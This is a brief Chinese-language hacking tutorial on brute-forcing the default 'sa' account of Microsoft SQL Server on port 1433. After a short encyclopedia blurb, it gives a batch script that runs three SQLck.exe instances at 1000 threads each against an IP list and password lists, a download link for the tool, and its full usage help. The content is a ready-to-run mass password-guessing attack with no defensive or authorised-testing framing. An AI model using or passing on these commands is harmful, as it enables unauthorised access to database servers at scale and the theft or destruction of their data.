    利用Sqlck对SA爆破

    SQL Server是由Microsoft开发和推广的关系数据库管理系统（DBMS），它最初是由Microsoft、Sybase和Ashton-Tate三家公司共同开发的，并于1988年推出了第一个OS/2版本。Microsoft SQL Server近年来不断更新版本，1996年，Microsoft 推出了SQL Server 6.5版本；1998年，SQL Server 7.0版本和用户见面；SQL Server 2000是Microsoft公司于2000年推出，目前最新版本是2019年份推出的SQL SERVER 2019。 —-百度百科

    默认端口1433

    默认账户SA

    Bat脚本

    保存存为bat文件，此为3个进程，每个进程1000线程

    start SQLck1.exe -i S.txt -p  pass1.txt -o iplist1.txt -l Them.txt -t 1000
start SQLck2.exe -i S.txt -p  pass2.txt -o iplist2.txt -l Them.txt -t 1000
start SQLck3.exe -i S.txt -p  pass3.txt -o iplist3.txt -l Them.txt -t 1000

    SQLck下载地址

    https://github.com/Knsec/Tools/blob/master/SQLck.exe

    Usage:  SQLck [Option1] [Option2] ...

Valid options are:
  -i <IP-list.txt>      :: IP address (numbers) list stored in an ASCII file
          Formats that are supported:: <IP>:<port>  ;  <IP> <port>                                       <IP> Port:<port>  ;  <IP> <port>/tcp
  -u <username.txt>     :: Username list stored in an ASCII file
  -p <password.txt>     :: Password list stored in an ASCII file
  -o <outputFile.txt>   :: Output file to use for output
  -d                    :: turn on Debug mode
  -t <number>           :: number of threads to use: default 128
  -l <logFile.txt>      :: Logfile to use for Logs
  -s <IP ADDRESS>:<port>:: to test one IP address (numbers only, NO DNS)
  -y <password>         :: to test one password
  -r <username>         :: to test one username
  -c                    :: To have threads use more CPU
  -m                    :: Max number of sockets to use (45,000 default)
  -a                    :: Check ALL pass, even if finds a good one

DEFAULTS: 'IP=127.0.0.1' 'Port=1433' 'Username=sa' 'Password=' 'Output to screen

EXAMPLE: SQLck -i IP.txt -p Pass.txt -o output.txt
  Means:using IP.txt for IP address list,,using Pass.txt for Password list,using output.txt to output any found passwords
